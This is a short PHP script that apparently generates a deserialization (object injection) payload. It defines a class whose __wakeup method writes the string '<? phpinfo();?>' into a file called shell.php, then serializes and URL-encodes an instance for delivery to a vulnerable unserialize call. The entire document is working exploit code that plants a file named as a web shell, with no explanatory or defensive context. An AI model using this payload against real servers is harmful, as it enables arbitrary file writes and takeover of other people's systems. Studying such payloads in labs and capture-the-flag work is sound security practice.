<?php
class test{
	public $test="<? phpinfo();?>";
	function __wakeup(){
		$fp = fopen("shell.php","w") ;
		fwrite($fp,$this->test);
		fclose($fp);
	}
}
$a = new test();
$b = serialize($a);
echo urlencode($b);
?>
